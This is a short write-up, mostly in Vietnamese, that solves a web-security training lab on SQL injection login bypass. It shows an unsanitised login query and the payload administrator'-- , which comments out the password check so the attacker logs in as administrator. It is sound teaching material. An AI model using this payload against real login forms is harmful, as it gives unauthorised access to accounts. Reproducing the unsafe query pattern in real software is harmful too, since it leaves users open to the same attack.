# **Lab: SQL injection vulnerability allowing login bypass**<br>

>  This lab contains a SQL injection vulnerability in the login function.<br>To solve the lab, perform a SQL injection attack that logs in to the application as the `administrator` user.<br>

# **Solution**

Vào trang đăng nhập của web `My account`<br>

Thông thường một câu lệnh truy vấn sql để đăng nhập không được bảo mật sẽ có dạng:
```
SELECT * FROM users WHERE username = 'zious' and password = 'p4$$w0rd'
```
Với `zious` và `p4$$w0rd` là dữ liệu nhập vào form đăng nhập.<br>
Để thực hiện tiêm sql và đăng nhập bằng tài khoản administrator ta có thể nhập tên đăng nhập là: `administrator'-- `. Khi đó câu truy vẫn sẽ thành:
```
SELECT * FROM users WHERE username = 'administrator'-- ' and password = ''
```
Vì phần sau comment `-- ` bị bỏ qua nên sẽ chỉ xét điều kiện username = 'administrator'. Nếu tồn tại tài khoản thì sẽ trả về thông tin tài khoản và thực hiện đăng nhập.


![Image](https://i.pinimg.com/736x/f5/68/04/f56804886125925b781864924c8c8ddc.jpg)